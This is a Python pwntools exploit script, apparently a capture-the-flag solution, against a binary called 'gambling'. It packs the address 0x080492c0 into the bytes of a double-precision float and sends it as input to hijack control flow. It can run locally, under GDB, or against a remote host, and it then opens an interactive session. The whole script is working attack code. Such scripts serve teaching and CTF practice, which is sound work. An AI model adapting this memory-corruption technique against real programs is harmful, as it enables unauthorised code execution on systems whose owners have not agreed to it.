#!/usr/bin/env python3
from pwn import *
import struct



def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ("server", "port")
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)

gdbscript = """
init-pwndbg
continue
"""

# libc = ELF("./libc.so.6")
# ld = ELF("")
exe = "./gambling"
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (error/warning/info/debug)
context.log_level = "debug"

s = lambda data: io.send(data)
sa = lambda msg, data: io.sendafter(msg, data)
sl = lambda data: io.sendline(data)
sla = lambda msg, data: io.sendlineafter(msg, data)
info = lambda msg: log.info(msg)
recvunt = lambda msg: io.recvuntil(msg)

# ===================EXPLOIT GOES HERE=======================

io = start()

# Target value: 0x080492c0
# We'll place it in the high 4 bytes (last half of 8 bytes in little endian)
raw_bytes = b'\x00\x00\x00\x00\xc0\x92\x04\x08'

# Convert to double
f = struct.unpack('<d', raw_bytes)[0]
print("Double value to send:", f)

# Double-check: pack back to bytes and view as QWORD
back_to_int = struct.unpack('<Q', struct.pack('<d', f))[0]
print("Hex representation in memory:", hex(back_to_int))

payload = b'1 '*4 + str(1).encode() + b' ' + str(1).encode() + b' ' + str(f).encode()

sla(b'numbers:', payload)

io.interactive()

